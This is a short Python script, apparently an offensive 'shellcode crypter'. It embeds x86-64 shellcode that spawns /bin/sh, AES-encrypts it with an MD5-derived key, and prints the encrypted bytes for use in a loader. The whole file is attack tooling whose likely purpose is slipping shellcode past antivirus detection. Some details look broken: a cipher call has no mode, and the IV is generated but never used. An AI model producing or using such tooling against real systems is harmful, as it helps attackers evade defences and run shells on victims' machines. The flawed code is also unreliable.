#!/usr/bin/env python3

from Crypto.Cipher import AES
import hashlib
import random

shellcode = b"\x48\x31\xc0\x50\x48\xbe\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x56\x48\x89\xe7\x48\x31\xf6\x48\x31\xd2\xb0\x3b\x0f\x05"

def md5_key(key):
    b_key = str.encode(key)
    hashed = hashlib.md5(b_key)
    return hashed.hexdigest()

def pad(shellcode):
    if len(shellcode) % 16 != 0:
        c = 16 - (len(shellcode) % 16)
        for x in range(c):
            shellcode += b"*"
    return shellcode

def format_code(shellcode):
    res = ""
    for x in shellcode:
        res += "\\x%02x" % x
    return res

key = input("Enter the key to encrypt the shellcode : ")
key = md5_key(key)
cipher = AES.new(key)
iv = "".join([chr(random.randint(0,255)) for i in range(16)])
encrypted = cipher.encrypt(pad(shellcode))

print("[+] Encrypted shellcode : \n{}\n".format(format_code(encrypted)))
print("[+] Encryption Key (MD5) : {}\n".format(key))
